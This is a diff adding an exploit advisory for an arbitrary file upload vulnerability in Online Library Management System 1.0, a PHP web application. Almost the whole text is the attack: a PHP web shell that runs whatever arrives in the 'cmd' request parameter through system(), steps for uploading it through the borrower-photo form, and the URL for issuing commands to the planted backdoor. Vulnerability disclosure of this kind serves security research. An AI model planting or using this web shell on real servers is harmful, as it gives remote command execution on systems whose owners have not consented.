@@ -1,0 +1,21 @@
+# Exploit Title: Online Library Management System 1.0 - Arbitrary File Upload
+# Date: 22-10-2020
+# Exploit Author: Jyotsna Adhana
+# Vendor Homepage: https://www.sourcecodester.com/php/14545/online-library-management-system-phpmysqli-full-source-code-2020.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14545&title=Online+Library+Management+System+in+PHP%2FMySQLi+with+Full+Source+Code+%282020%29
+# Version: 1.0
+# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
+
+
+#Vulnerable Page: http://localhost/librarysystem/admin/borrower/index.php?view=add
+
+#Exploit
+	Fill details
+	Create php shell code with below script
+		<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+	Click on Browse
+	Select php file
+	Click Save
+	Access below URL:
+		http://localhost/librarysystem/admin/borrower/photos/23102020080814backdoor.php?cmd=dir
+	add system commands after cmd to execute it.
